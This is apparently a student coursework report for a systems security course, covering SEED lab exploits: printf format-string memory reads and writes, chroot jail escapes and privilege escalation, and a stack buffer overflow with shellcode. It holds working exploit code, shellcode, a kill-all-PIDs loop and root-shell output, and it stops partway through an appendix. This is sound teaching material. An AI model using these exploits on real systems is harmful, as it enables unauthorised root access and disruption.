\documentclass[12pt, a4paper, pdflatex]{article}

\usepackage[top=1in, bottom=1in, left=1in, right=1in]{geometry}
\newcommand{\HRule}{\rule{\linewidth}{0.5mm}}
\usepackage{lipsum}
\usepackage[labelfont=bf]{caption}
\usepackage[]{algorithm2e}
\usepackage{listings}

\renewcommand{\thesubsubsection}{\thesubsection.\alph{subsubsection})} %subsubsections with letters

\usepackage{amsmath}
\usepackage{amsfonts}    % fancy maths font
\usepackage{mathrsfs}    % fancy maths font
\usepackage{dsfont}      % indocator finction
\usepackage{hyperref}
\usepackage[page, toc]{appendix}
\usepackage[usenames,dvipsnames]{color}

% \newcommand{\ts}{\textsuperscript}
% \usepackage{url}

\begin{document}
\pagenumbering{gobble}% Remove page numbers

\begin{center}
    \begin{large}
    {\HRule \\[0.2cm]}
    \textsc{System exploits}
    {\HRule \\[0.3cm]}
    \end{large}

    \begin{minipage}{ 0.49\textwidth }
        \begin{flushleft}
            Kacper \textbf{Sokol}---\texttt{ks1591}---4GGK1\\
            Maciej \textbf{Kumorek}---\texttt{mk0934}---4G403\\
        \end{flushleft}
    \end{minipage}
    \begin{minipage}{ 0.49\textwidth }
        \begin{flushright}
            {COMSM1500 $|$ Systems Security\\
            Coursework: Part A---\today\\[0.3cm]}
        \end{flushright}
    \end{minipage}
\end{center}

\section{Introduction}
In this paper we present exploiting vulnerabilities in: \texttt{C} string formatting, \texttt{chroot} command/system call, and \texttt{C} buffer overflow.\\
In each subtask we address cause of vulnerability, potential attack, and reflection on created risk. Methods used to exploit these weaknesses are described in depth; algorithms, code, input, and output are included for clarity.\\
\textbf{Table~\ref{tab:SoC}} shows contribution to this study per author.

\begin{center}
  \begin{table}[h]
    \begin{tabular}{ l | p{8.5cm} | c }
      Group member ID & Contribution outline & Contribution \\
      \hline
      ks1591 &
      \begin{itemize}
        \item setting up lab environment on personal computer,
        \item creating report template,
        \item background reading,
        
      \end{itemize}
      & 50\% \\
      mk0932 &
      \begin{itemize}
        \item setting up lab environment on personal computer,
        \item setting up git repository for coursework files,
        \item background reading,
      \end{itemize}
      & 50\% \\
    \end{tabular}
    \caption{Statement of contribution.\label{tab:SoC}}
  \end{table}
\end{center}

\section{String formatting}

Our first task was to exploit program using \emph{printf} method for formatted string output in a vulnerable way. We followed instructions of lab assignment  \url{http://www.cis.syr.edu/~wedu/seed/Labs/Vulnerability/Format_String/}
and used Ubuntu 9.10 SEED for our lab set up.

In the target program provided, a \emph{printf} method was used without any format specifier, combined with the ability for users to specify input, allowed user to fabricate any format specifier for the program, i.e. instead of printing the user output in the following way:
\vspace{1em}
\lstset{
	captionpos=b,
	frame=single,
	language=C,
  breaklines=true,
	caption=Fragment of code that would not include the vulnerability,
	label=chroot:vul,
  float=tb
}
\begin{lstlisting}
/* Get input from user */
scanf("%s", &user_input);
/* Print what user typed */
printf("%s", user_input);
\end{lstlisting}
the \emph{printf} was used without explicitly specifying that we want to print to standard output a string.
\vspace{1em}
\lstset{
	captionpos=b,
	frame=single,
	language=C,
  breaklines=true,
	caption=Fragment of includes the vulnerability,
	label=chroot:vul2,
  float=tb
}
\begin{lstlisting}
/* Get input from user */
scanf("%s", &user_input);
/* Print what user typed */
printf(user_input);
\end{lstlisting}


\subsection{Exploiting the vulnerability}
Being able to specify the string format specifier allows us to use \texttt{printf} method in order to either crash a program, look up values on stack and memory and even modify content at specific memory locations with a specified value. We used the following features of \texttt{printf} specifier string:
\begin{itemize}
	\item \texttt{\%x} - prints hexadecimal value provided in the arguments list
	\item \texttt{\%s} - prints value at the current memory location from the heap provided by arguments list
	\item \texttt{\%n} - writes number of bytes written so far to the output at the current location provided by arguments list
\end{itemize}
It's important to realize that argument list for printf would be kept on the stack. Therefore we can use \texttt{printf} to traverse the stack using for instance many \texttt{\%x} in the input string.

\subsubsection{Crashing the program}
In order to crash the program it was enough to provide a string as input that contained a few \texttt{\%s}. This way values popped from the stack would be provided to the \texttt{printf} method and memory address at the locations specified by the values. At some point the program attempts to access memory that the process shouldn't be able to. This results in a segmentation fault and a crash of the program.

\vspace{1em}
\lstset{
	captionpos=b,
	frame=single,
	language=bash,
  breaklines=true,
	caption=Example of crashing the program,
	label=printf:crash,
  float=tb
}
\begin{lstlisting}
seed@seed-desktop:~/cwk2$ ./a.out 
The variable secret's address is 0xbf8f35d8 (on stack)
The variable secret's value is 0x 9c1d008 (on heap)
secret[0]'s address is 0x 9c1d008 (on heap)
secret[1]'s address is 0x 9c1d00c (on heap)
Please enter a string
%s%s%s%s%s%s%s%s
Segmentation fault
\end{lstlisting}

\subsubsection{Printing out specified memory from heap}
In the second part of this task we wanted to be able to provide such a format specifier that would allow us to print out some specified memory location. In this example we wanted to print out value of two-element array secret. Because provided vulnerable program to exploit prints out the address of both secrets values on the heap, we know where to look for them. We need to use \texttt{\%s} format specifier to access memory location of 
\texttt{secret} array. We ask to print six values from the stack, and the next variable on the stack would contain address to the first element of secret. However, secret is on the heap, so it's not to easy to access the second element of the array. We used the fact that a user is also prompted to input the decimal integer. Hence at runtime we can see where \texttt{secret[1]} is, and provide the address of \texttt{secret[1]} on heap, in decimal format, to be stored in \texttt{int\_input} integer variable. Now since that value is on the stack, after poping initial 5 values, if we also add \texttt{\%s.\%s} in the format specifier string, we tell \texttt{printf} to show us memory content at next two memory locations, specified by the contents of next two values on the stack, which corresponds to \texttt{secret[1]} and \texttt{secret[0]} and in the output below we can see that U and D are printed. These two characters have ASCII values of 0x55 and 0x44 which is what we wanted.

\vspace{1em}
\lstset{
	captionpos=b,
	frame=single,
	language=bash,
  breaklines=true,
	caption=Example of printing out memory,
	label=printf:crash,
  float=tb
}
\begin{lstlisting}
seed@seed-desktop:~/cwk2$ ./vul
The variable secret’s address is 0xbf8b258c (on stack)
The variable secret’s value is 0x 95fd008 (on heap)
secret[0]’s address is 0x 95fd008 (on heap)
secret[1]’s address is 0x 95fd00c (on heap)
Please enter a decimal integer
157274124
Please enter a string
%x.%x.%x.%x.%x.%s.%s   
bf8b2590.bf8b2610.bf8b2604.0.0.U.D
The original secrets: 0x44 -- 0x55
The new secrets:      0x44 -- 0x55
\end{lstlisting}

\subsubsection{Changing the value of \texttt{secret[1]}}

In order to change value of the second element of \texttt{secret} array, similar approach must be taken as for printing it, i.e. we provide address of the value that interests us to be stored int \texttt{int\_input} variable, then we must pop elements of the stack by providing format specifier with a number of \texttt{\%x}s, and then instead of printing value of heap memory in location contained in the next element on the stack, we can use \texttt{\%n} to write modify the memory location. Example is shown in listing~\ref{printf:change}. As we can see, we are able to change the value of the secret from 0x55 to 0x1a.

\vspace{1em}
\lstset{
	captionpos=b,
	frame=single,
	language=BASH,
	caption=Example of overwriting memory,
	label=printf:change,
	breaklines=true,
  float=tb
}
\begin{lstlisting}
seed@seed-desktop:~/cwk2$ ./vul
The variable secret’s address is 0xbf83550c (on stack)
The variable secret’s value is 0x 9448008 (on heap)
secret[0]’s address is 0x 9448008 (on heap)
secret[1]’s address is 0x 944800c (on heap)
Please enter a decimal integer
155484172
Please enter a string
%x%x%x%x%x%n
bf835510bf835590bf83558400
The original secrets: 0x44 -- 0x55
The new secrets:      0x44 -- 0x1a
\end{lstlisting}

\subsubsection{Changing the value of \texttt{secret[1]} to a pre-determined value}

If we wanted to change \texttt{secret[1]} to a pre-determined value, we need to know exactly what \texttt{\%n} format specifier does. We know it prints a number of bytes printed in output so far into memory location on the heap determined by the current value on the top of the stack. We can see in~\ref{printf:change} that we changed the secret to 0x1a, or 26 in decimal, and before that we printed "bf835510bf835590bf83558400" which is exactly 26 one-byte wide characters. This is the minimum value we can set it to, however if we add more characters, we can keep increasing the number that will be stored in \texttt{secret[1]} until we reach desired value. For instance, if we wanted to change the value to 30 (or 0x1E), we need to stick four more characters into the format specifier string as shown in~\ref{printf:change2} where we added "AAAA".  

\vspace{1em}
\lstset{
	captionpos=b,
	frame=single,
	language=BASH,
	caption=Example of overwriting memory with a specified value,
	label=printf:change2,
	breaklines=true,
  float=tb
}
\begin{lstlisting}
seed@seed-desktop:~/cwk2$ ./vul
The variable secret’s address is 0xbff74c4c (on stack)
The variable secret’s value is 0x 9b18008 (on heap)
secret[0]’s address is 0x 9b18008 (on heap)
secret[1]’s address is 0x 9b1800c (on heap)
Please enter a decimal integer
162627596
Please enter a string
%x%x%x%x%xAAAA%n
bff74c50bff74cd0bff74cc400AAAA
The original secrets: 0x44 -- 0x55
The new secrets:      0x44 -- 0x1e
\end{lstlisting}

\subsection{Memory randomization}

Last part of the task was to show if we can perform the four task we executed before if we didn't have the extra \texttt{scanf} method that allows us to store an integer from user input into \texttt{int\_input} variable in the vulnerable program.

Not having the additional user input doesn't stop us from injecting our desired address into the \texttt{user\_input} array that we use in the second \texttt{scanf}. However we could not specify address from the keyboard, because letters and number of the address would be transformed into ASCII characters, which is not what we need.

We used, however, a program \texttt{write\_file.c} so it can prepare input for us that will contain the address at the beginning.

\vspace{1em}
\lstset{
	captionpos=b,
	frame=single,
	language=C,
	caption=Example of overwriting memory with a specified value,
	label=printf:writefilec,
	breaklines=true,
  float=tb
}
\begin{lstlisting}
#include <sys/stat.h>
#include <fcntl.h>
int main()
{
  char buf[1000];
  int fp, size;
  unsigned int *address;
  /* Putting any number you like at the beginning of the format string */
  address = (unsigned int *) buf;
  
  /* Put address of secret[1] in first four bytes */
  *address = 0x0804b01c;
  
  /* Getting the rest of the format string */
  scanf("%s", buf+4);
  size = strlen(buf+4) + 4;
  printf("The string length is %d\n", size);
  
  /* Writing buf to "mystring" */
  fp = open("mystring", O_RDWR | O_CREAT | O_TRUNC, S_IRUSR | S_IWUSR);
  if (fp != -1) {
    write(fp, buf, size);
    close(fp);
  } else {
    printf("Open failed!\n");
  }
}
\end{lstlisting}

In order to execute this task we had to disable virtual address space randomization, so that at every consecutive execution of our program the memory addresses of the \texttt{secret} would stay exactly the same. We needed the address to stay to same, in order to run the vulnerable program once, take note of the address, run our program \texttt{write\_string} that creates a file to be used as input, and run vulnerable program again and be sure that the address space is exactly as during previous run.
After turning off address randomization, we had to add an extra memory allocation to the vulnerable program, because the address we were given contained \texttt{0x0C} character which is 'form feed' symbol in ASCII, and \texttt{printf} would not treat entire address as a single value.

\vspace{1em}
\lstset{
	captionpos=b,
	frame=single,
	language=BASH,
	caption=Example of printing memory using a file as standard input,
	label=printf:writefile1,
	breaklines=true,
  float=tb
}
\begin{lstlisting}
seed@seed-desktop:~/cwk2$ ./write_string
%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%s
The string length is 36
seed@seed-desktop:~/cwk2$ ./vul < mystring
The variable secret’s address is 0xbffff4e8 (on stack)
The variable secret’s value is 0x 804b018 (on heap)
secret[0]’s address is 0x 804b018 (on heap)
secret[1]’s address is 0x 804b01c (on heap)
Please enter a string
bffff4ec.bffff560.bffff554.bffff5f4.0.0.bffff5a0.b7fff670.80482bf.804b018.U
The original secrets: 0x44 -- 0x55
The new secrets:      0x44 -- 0x55
\end{lstlisting}

In the listing~\ref{printf:writefile1} we can see that we run program \texttt{write\_string} which creates and writes into a file called 'mystring'. The program asks the user for input what makes it possible to provide the rest of format specifier as in previous the part of this task. Then we use the file as standard input to the vulnerable program. First four bytes of \texttt{user\_input} now will contain the address of \texttt{secret[1]} which we hardcoded at the beginning of the file and the rest will be the format specifier for \texttt{printf}. NB now we have to pop more values off the stack, because \texttt{user\input} is defined at the beginning of the method so it gets pushed to the stack earlier. As the result, when \texttt{user\_input} is at top of the stack and \texttt{printf} 'executes' \texttt{\%s} we print the location stored at the beginning of this buffer. In the similar way we can overwrite memory at specified location, simply by providing similar format specifier as in previous part, i.e. containing \texttt{\%n}.

\vspace{1em}
\lstset{
	captionpos=b,
	frame=single,
	language=BASH,
	caption=Example of overwriting memory with a specified value using a file as standard input,
	label=printf:writefile2,
	breaklines=true,
  float=tb
}
\begin{lstlisting}
seed@seed-desktop:~/cwk2$ ./write_string
%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.ABCD%n    
The string length is 40
seed@seed-desktop:~/cwk2$ ./vul < mystring
The variable secret’s address is 0xbffff4e8 (on stack)
The variable secret’s value is 0x 804b018 (on heap)
secret[0]’s address is 0x 804b018 (on heap)
secret[1]’s address is 0x 804b01c (on heap)
Please enter a string
bffff4ec.bffff560.bffff554.bffff5f4.0.0.bffff5a0.b7fff670.80482bf.804b018.ABCD
The original secrets: 0x44 -- 0x55
The new secrets:      0x44 -- 0x52
\end{lstlisting}



\section{\texttt{chroot} vulnerability}
This section addresses \texttt{chroot} vulnerability described in \url{http://www.cis.syr.edu/~wedu/seed/Labs/Vulnerability/Chroot/}. Useful insight for this section is presented in~\cite{chroot}.

\subsection{Understanding how \texttt{chroot} works}
\subsubsection{Symbolic link}
It is \emph{not} possible to follow symbolic link pointing outside of \texttt{chroot} jail.\\
Symbolic link uses absolute or relative path to given fail, hence once in jail this relative path is not valid any-more.

\subsubsection{Hard link}
It \emph{is} possible to follow hard link pointing outside of \texttt{chroot} jail.\\
Hard links are used all over the operating system to point to given location in file-system. Therefore regardless of jail the link always points to the same location in file-system.

\subsubsection{File descriptors}
If \texttt{chroot} is done by a command, the program outside of the jail can still access the file, but it is not possible to access this file from within jail.\\
On contrary, with \texttt{chroot()} system call according to it's manual page: ``This call does not close open file descriptors, and such file descriptors may allow access to files outside the chroot tree.'', hence, it is possible to access the file descriptor from both: outside and inside the jail.

\subsubsection{Command vs.\ system call}
First of all, as mentioned above, system call does not close open file descriptors. Moreover, system call does not change current working directory and command does.

\subsection{Abusing unconstrained \texttt{chroot}}
\subsubsection{\texttt{set-UID} in jail}
\emph{Set-root-UID} programs can be run inside \texttt{chroot} jail.

\subsubsection{Getting root with \texttt{su}}
It is possible to gain root privileges using \texttt{/tmp/su}. The \texttt{su} command uses \texttt{/etc/shadow} and \texttt{/etc/passwd} to verify super user authentication. We can create these files in jail---see \textbf{Listing~\ref{chroot:shadow}~and~\ref{chroot:passwd}}---to allow such authentication.\\
In this example we used known password hash of \texttt{seed} user with changed first line form \texttt{seed} to \texttt{root}, and the second file is just custom entry for root user.\\
These operations facilitate gaining \texttt{root} privileges within jail using seed password, namely ``dees''.

\vspace{1em}
\lstset{
  captionpos=b,
  frame=single,
  caption=\texttt{shadow} file in jail.,
  label=chroot:shadow,
  float=tb
}
\begin{lstlisting}
root:$6$5MfvmFOaDU$CVt7jU9wJRYz3K98EklAJqp8RMG5NvReUSVK7ctVvc2VOn
   YVrvyTfXaIgHn2xQS78foEJZBq2oCIqwfdNp.2V1:14400:0:99999:7:::
\end{lstlisting}
\vspace{1em}
\lstset{
  captionpos=b,
  frame=single,
  language=bash,
  breaklines=true,
  caption=\texttt{passwd} file in jail.,
  label=chroot:passwd,
  float=tb
}
\begin{lstlisting}
root:x:0:0:root:/root:/bin/bash
\end{lstlisting}

\subsubsection{Preserve root privileges after exiting jail}
It is possible to regain root privileges once exited the jail. To this end, we write simple \texttt{C} program shown in \textbf{Listing~\ref{chroot:regainingroot}}. Once compiled, we apply set-root-UID to it by executing \texttt{chown root prog} and \texttt{chmod 4755 prog}.\\
After leaving \texttt{chroot} jail we execute this program and gain root privileges in non-restricted environment. This technique works as set-root-UID done in jail is not removed while exiting it hence normal user can run this script which in turn calls \texttt{su -c "/bin/bash"} as a root resulting in root shell.

\vspace{1em}
\lstset{
  captionpos=b,
  frame=single,
  language=C,
  breaklines=true,
  caption=Simple \texttt{C} code allowing to regain \texttt{root} privileges.,
  label=chroot:regainingroot,
  float=tb
}
\begin{lstlisting}
int main(){
  setuid(0);
  system("su -c \"/bin/bash\"");
  return 0;
}
\end{lstlisting}

\subsection{Breaking out of a \texttt{chroot} jail}
\subsubsection{\texttt{cd ..} out of jail}
It is possible to see full directory list of an operating system from within \texttt{chroot} jail. The full \texttt{C} code that we prepared is available in \textbf{Appendix~\ref{app:chroot:cd}} and the quick overview is presented below in \textbf{Algorithm~\ref{alg:chroot:cd}}.


\RestyleAlgo{boxed}
\SetAlCapSkip{1em}
\LinesNumbered
\SetCommentSty{mycommfont}
\vspace{1em}
\begin{algorithm}[h]
  \tcc{Once inside the jail}
  Create empty directory: \texttt{injail}\;
  Remember the pointer $p$ to \texttt{injail} directory\;
  \texttt{chroot} to \texttt{injail} directory\;
  Get out of second jail by changing directory using pointer $p$\;
  \For{$i \leftarrow 1:1024$}{
    Try going down (\texttt{..}) the file tree: \texttt{chdir("..")}\;
  }
  \texttt{chroot} to current (\texttt{.}) directory\;
  \tcc{You are out of the jail}
  Do system call to \texttt{/bin/bash} to gain root shell.
  \caption{Escaping out of \texttt{chroot} jail.\label{alg:chroot:cd}}
\end{algorithm}
\vspace{1em}

This procedure is possible as \texttt{chroot()} system call does not close opened file descriptors. Once inner-jail is created we can escape from it using previously opened file descriptor, hence we break the \emph{i-node} structure what allow us to \texttt{cd ..} back to system's root directory \texttt{/}.

\subsubsection{Killing process from within the jail}
As the \texttt{/proc} is not mounted in the jail it is not possible to kill process by its name, but it is possible to kill process by its PID. \textbf{Listing~\ref{chroot:kill}} shows how to kill processes with PID in range 1--10000.\\
If command is not available it is still possible to use pre-compiled program using \texttt{kill(pid, SIGQUIT)} system call.\\
It is possible to kill processes outside of \texttt{chroot} jail as both the jail and the system share the same \emph{PID namespace}.


\vspace{1em}
\lstset{
  captionpos=b,
  frame=single,
  language=bash,
  breaklines=true,
  caption=Kill processes outside of chroot jail.,
  label=chroot:kill,
  float=tb
}
\begin{lstlisting}
#!/bin/bash
i="1"
while [ $i -lt 10000 ]
  do
  echo $i
  kill $i
  i=$[$i+1]
done
\end{lstlisting}

\subsubsection{Controlling processes with \texttt{ptrace()}}
\texttt{ptrace()} system call can pause a process with given PID and introduce changes to its registers and memory locations. As mentioned above both system and jail share the PID namespace hence user from within the jail can alter properties of any process outside of the jail.\\
Using technique similar to one presented in \textbf{Section~\ref{sec:buffover}}, root privileges can be gained.

\subsection{Securing \texttt{chroot}}
\begin{description}
  \item[In-jail non-root shell]---majority of harm to the system is done by gaining root privileges inside the jail.
  \item[Remove permissions on leaving jail]---make sure that all permissions set by user in jail are reset to default values on exit and disable \texttt{setuid} family of commands and system calls.
  \item[Prevent \texttt{chroot} below current directory]---enforce changing directory to jail-one while calling \texttt{chroot} i.e.\ \texttt{chdir(dir); chroot(dir);}.
  \item[Minimise number of commands and files available in jail].
  \item[Files in the jail owned by root]---if root owns the files user does not have access to them, hence cannot tamper with them.
  \item[Limited permissions]---cut down all files permissions in jail as much as possible.
  \item[No links inside jail]---hard links can be accessed from within the jail and any alterations made via such links will carry on to the system.
  \item[Close all unnecessary file descriptors prior to entering the jail].
\end{description}

\section{Buffer overflow\label{sec:buffover}}

In our next lab assignment described at \url{http://www.cis.syr.edu/~wedu/seed/Labs/Vulnerability/Buffer_Overflow/} we were to exploit buffer overflow vulnerability in a given example program.

The vulnerable code we were given, was reading input from a file called \texttt{badfile} and calling a \texttt{bof(...)} method shown in~\ref{bof1} that contained the vulnerability.

\vspace{1em}
\lstset{
	captionpos=b,
	frame=single,
	language=C,
	breaklines=true,
	caption=Function with buffer overflow vulnerability,
	label=bof1,
  float=tb
}
\begin{lstlisting}
int bof(char *str)
{
  char buffer[12];

  /* The following statement has a buffer overflow problem */ 
  strcpy(buffer, str);

  return 1;
}
\end{lstlisting}
In the vulnerable program, a buffer that is 517 bytes in size is passed to the method \texttt{bof} and then the method copies the entire buffer into a variable \texttt{buffer}, which is likely overflow the buffer and thus overwrite the content of the stack.

\subsection{Exploiting the Vulnerability}

Our first task was to try to exploit the vulnerability and gain root access to the machine. We could assume that the vulnerable program in \emph{Set-root-UID} mode. Moreover we could assume that it is compiled with a flag that disables stack protection (\texttt{-fno-stack-protector})~\cite{gnu13} and that virtual address space randomization is off.

The idea for exploiting such a vulnerability is to make the program run a command that the original developer did not intend. In order to force executing some command, we need to inject some code into the running program using a shellcode. 

The shellcode is set of encoded instructions of a program that calls \texttt{system("/bin/sh")} system call. Because the program is run with \emph{Set-UID} 0, we would get root access to once \texttt{/bin/sh} is executed. In our lab set up, symbolic link \texttt{system("/bin/sh")} points to \texttt{zsh} rather than \texttt{bash}.

Once the vulnerable program reads the shellcode from the input file into a buffer, it copies the buffer to some place on the stack in the \texttt{bof} method because the \texttt{strcpy} does not check the boundaries of the buffers. This way we can place the in the program being executed with root permission.

It is not enough, however, to inject the shellcode, because when the program finishes executing \texttt{bof} method, it returns (or at least attempts to return) to \texttt{main} method. The program might crash at this point and this is because there is a return address on the stack and we might overwrite it.

So, our goal is to modify the return address in such a way, so that the program carries on execution not back in \texttt{main} method, but on the stack where our malicious shell code is. We copied the code of vulnerable program and examined the stack with GDB. We quickly discovered, that we could obviously ignore first 12 bytes, also we could next four bytes as they are first argument provided to the function which just a pointer in our case which is 4 bytes. Next two values are our return address and saved stack frame pointer, so in total we could skip 16 bytes and place our own "return address" there. Our exploit's code is shown in \textbf{Appendix~\ref{app:bof:exploit1}}.
We discovered where we want to put our address in order to force the \texttt{bof} method to jump to our code upon returning from the function, however we now had to think what value of an address to write there. Because virtual space randomization is turned off, we could use the value of \text{buffer} array in the exploit as a reference. By trial and error we discovered that the the stack point points a bit further in the vulnerable program when executing the string copy method, therefore we hard coded a value by which we need to increase desired address. Also, most of the buffer is pre-filled with \texttt{NOP} instructions to which we jump on the stack, and then after executing many \texttt{NOP}s we reach our mallicious code and we can get root access as shown below in Listing~\ref{bof:root1}.
\vspace{1em}
\lstset{
	captionpos=b,
	frame=single,
	language=BASH,
	breaklines=true,
	caption=Function with buffer overflow vulnerability,
	label=bof:root1,
  float=tb
}
\begin{lstlisting}
seed@seed-desktop:~/buffer$ ./exploit 
Size of shellcode: 25
Using Stack pointer at address: bffff324
Buffer size: 517, shell code size: 25
I will start writing to bffff50f
seed@seed-desktop:~/buffer$ ./stack 
# whoami                                                                       
root
# 
\end{lstlisting}


\subsection{Protection in /bin/bash}

Next step of our task was to test if we can use the exploit to get root access if
the \texttt{/bin/sh} symbolic link pointed back to \texttt{/bin/bash} rather than Z-shell. It turned out that exploit could execute bash, however no root access was given even though the vulnerable program  process runs with the user ID set to 0 (root). 

As it turns out, Bash shell has implemented a protection mechanism. If the current user uid number does not match the Set-UID of the processes it is executed from, Bash sets the uid of the user, so in our case it ignores the fact that the program that launched the shell was running with root's user id. The workaround to this problem is to use \texttt{setuid} system call, which "sets the effective user ID of the calling process"\cite{setuidman} before launching the shell, so that current user and the program launching bash will have matching uid of 0. We had to change the program we wanted to execute so that it makes a call to \texttt{setuid} before calling symbolic link \texttt{/bin/sh}. Rather than creating our own shell-code from scratch we found a ready solution in an on-line shellcode repository\cite{shellstorm}. Using this shell code in our exploit, without further modifications we were able to gain root access in Bash.

\vspace{1em}
\lstset{
	captionpos=b,
	frame=single,
	language=BASH,
	breaklines=true,
	caption=Function with buffer overflow vulnerability,
	label=bof:root2,
  float=tb
}
\begin{lstlisting}
seed@seed-desktop:~/buffer$ ./exploit 
Size of shellcode: 30
Using Stack pointer at address: bffff314
Buffer size: 517, shell code size: 30
I will start writing to bffff4fa
seed@seed-desktop:~/buffer$ ./stack 
sh-3.2# id
uid=0(root) gid=1000(seed) groups=4(adm),20(dialout),24(cdrom),46(plugdev),106(lpadmin),121(admin),122(sambashare),1000(seed)
sh-3.2# whoami
root
sh-3.2# 
\end{lstlisting}

\subsection{Address Randomization}

We were also able to show that we can obtain root access when address space randomization is turned on. Our exploit produced a file that contains address that will be placed on stack in place of return address for \texttt{bof} method. However this address was our educated guess, and now this guess is incorrect in most case. However the address space is finite, so at some point we might be lucky and our guess will be correct and the address we chose becomes valid. So it is enough to run the vulnerable program in a loop, until the random address is good enough for us. In most cases the program crashes, as we try to jump into memory location that is not permitted, but sooner or later we succeed.

\vspace{1em}
\lstset{
	captionpos=b,
	frame=single,
	language=BASH,
	breaklines=true,
	caption=Getting root access with address space randomization,
	label=bof:loop,
  float=tb
}
\begin{lstlisting}
seed@seed-desktop:~/buffer$ sh -c "while [ 1 ]; do ./stack; done;"

# Skipped some lines

sh: line 1:  4145 Segmentation fault      ./stack
sh: line 1:  4146 Segmentation fault      ./stack
sh: line 1:  4147 Segmentation fault      ./stack
sh-3.2# 

\end{lstlisting}

In order to maximize the chance of being lucky and minimize the number of attempts required to succeed, we used the fact that our buffer is 517 bytes long and placed the shell code at the very end of it. The remaining space of buffers is full of NOPs, so we leave many places to which we can "jump" into and reach our shell code.

\subsection{Stack Guard}

Last stage of the assignment makes us create the vulnerable program with the stack protector described earlier enabled, i.e. no \texttt{-fno-stack-protector} flag is used during compilation. When we now try to run the program we can see that "stack smashing" was detected and the system aborts further execution as shown in the listing~\ref{app:bof:stackg}.
\vspace{1em}
\lstset{
	captionpos=b,
	frame=single,
	language=BASH,
	breaklines=true,
	caption=Stack smashing detected,
	label=app:bof:stackg,
}
\begin{lstlisting}
seed@seed-desktop:~/buffer$ ./stack 
*** stack smashing detected ***: ./stack terminated
======= Backtrace: =========
/lib/tls/i686/cmov/libc.so.6(__fortify_fail+0x48)[0xb7fefda8]
/lib/tls/i686/cmov/libc.so.6(__fortify_fail+0x0)[0xb7fefd60]
./stack[0x8048513]
[0x90909090]
======= Memory map: ========
08048000-08049000 r-xp 00000000 08:01 8403       /home/seed/buffer/stack
08049000-0804a000 r--p 00000000 08:01 8403       /home/seed/buffer/stack
0804a000-0804b000 rw-p 00001000 08:01 8403       /home/seed/buffer/stack
\end{lstlisting}

With stack protector turned on, GCC adds extra code at the beginning and end of the function to watch of buffer overflows and hence aborts if the guarding code detected any corruption to the stack\cite{gnu13}.

\section{Conclusions}
Presented here attacks show how user can make harm to the system or gain \texttt{root} privileges by exploiting vulnerabilities in: \texttt{C} string formatting, \texttt{chroot} command/system call, and \texttt{C} buffer overflow. The vulnerabilities presented here have already been addressed in newer versions of Linux kernel or \texttt{C} compiler, nevertheless, many embedded systems like: Internet cameras, NASes, and routers still use vulnerable software facilitating aforementioned attacks.

\vfill
\bibliographystyle{plain}
\bibliography{ref}

\newpage
\begin{appendices}
\section{\texttt{cd ..} out of \texttt{chroot} jail\label{app:chroot:cd}}
\lstset{
  captionpos=b,
  frame=single,
  language=C,
  breaklines=true,
  caption=Simple \texttt{C} code allowing to \texttt{cd ..} out of \texttt{chroot} jail.,
  label=chroot:cd
}
\begin{lstlisting}
#include <stdio.h>
#include <sys/types.h>
#include <dirent.h>
#include <errno.h>
#include <stdlib.h>

void print_current();

int main(int argc, char** argv) {
  int i;
  DIR *dir;
  print_current();
  puts("Chroot to /tmp\n");

  // Create jail
  if(chroot("/tmp") != 0) {
    printf("chroot to /tmp failure \n");
    exit(EXIT_FAILURE);
  }

  // Create dir
  dir = opendir("bin");


  if(chroot("/bin") != 0) {
    printf("chroot to /bin failure \n");
    exit(EXIT_FAILURE);
  }

  print_current();

  puts("Chdir to the hander\n");
  if(chdir(dir) != 0)
    printf("change directory to handler failure \n");

  print_current();

  for(i = 0; i < 1024; i++) {
    if(chdir("..") != 0) {
      printf("%d Unable to cd ..\n", i);
    }
  }

  print_current();

  / Chroot to  .
  if(chroot(".") != 0) {
    printf("chroot failure \n");
    exit(EXIT_FAILURE);
  }

  system("/bin/bash");

  return 0;
}

void print_current() {
  char buffer[100];

  getcwd (buffer, 50);
  printf("Current Directory: %s\n", buffer);
  return;
}
\end{lstlisting}


\section{Buffer overflow exploits\label{app:bof:exploit1}}
\lstset{
	captionpos=b,
	frame=single,
	language=C,
	breaklines=true,
	caption=Exploit for getting root with zsh,
	label=bof:exploit1
}
\begin{lstlisting}
/* exploit.c  */

/* A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char shellcode[]=
"\x31\xc0"      /* xorl  %eax,%eax   */
"\x50"          /* pushl %eax        */
"\x68""//sh"    /* pushl $0x68732f2f */
"\x68""/bin"    /* pushl $0x6e69622f */
"\x89\xe3"      /* movl  %esp,%ebx   */
"\x50"          /* pushl %eax        */
"\x53"          /* pushl %ebx        */
"\x89\xe1"      /* movl  %esp,%ecx   */
"\x99"          /* cdql              */
"\xb0\x0b"      /* movb  $0x0b,%al   */
"\xcd\x80"      /* int   $0x80       */
;

void main(int argc, char **argv)
{  
  char buffer[517];
  FILE *badfile;
  long fcP;
  int buffer_size, shell_code_size;
  
  buffer_size = sizeof(buffer);
  shell_code_size = sizeof(shellcode);
  
  /* Initialize buffer with 0x90 (NOP instruction) */
  memset(&buffer, 0x90, 517);
  
  /* You need to fill the buffer with appropriate contents here */
  printf("Size of shellcode: %d\n", sizeof(shellcode));
  
  /* Print stack pointer */
  fcP = &buffer;
  
  /* Make sure is multiple of 4 */ 
  while(fcP % 4 != 0) {
    fcP += 1;
  }
  
  printf ("Using Stack pointer at address: %x\n", fcP);
  printf ("Buffer size: %d, shell code size: %d\n", buffer_size, shell_code_size);
  
  /* Compute how far we can palce shell code, we want it towards the end of buffer */
  long address_to_copy_to = fcP + buffer_size - 1 - shell_code_size;
  printf ("I will start writing to %08x\n", address_to_copy_to);
  
  /* We use address of buffer as reference, but we want to jump a bit more into the stack, yet not too far */
  fcP += 80;
  
  /* Place the address we want to in a position that would overwrite return address (16 bytes into stack) */
  long addr = fcP;
  long *ptr = (long*)(buffer + 16);
  *(ptr) = addr;
  
  /* Copy shellcode */
  memcpy(address_to_copy_to, shellcode, shell_code_size);
  
  /* Save the contents to the file "badfile" */
  badfile = fopen("./badfile", "w");
  fwrite(buffer, 517, 1, badfile);
  fclose(badfile);
}
\end{lstlisting}

\lstset{
	captionpos=b,
	frame=single,
	language=C,
	breaklines=true,
	caption=Exploit for getting root with bash,
	label=bof:exploit2
}
\begin{lstlisting}
/* exploit.c - Bash version  */
/* A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

/* 
	Shell code from: 
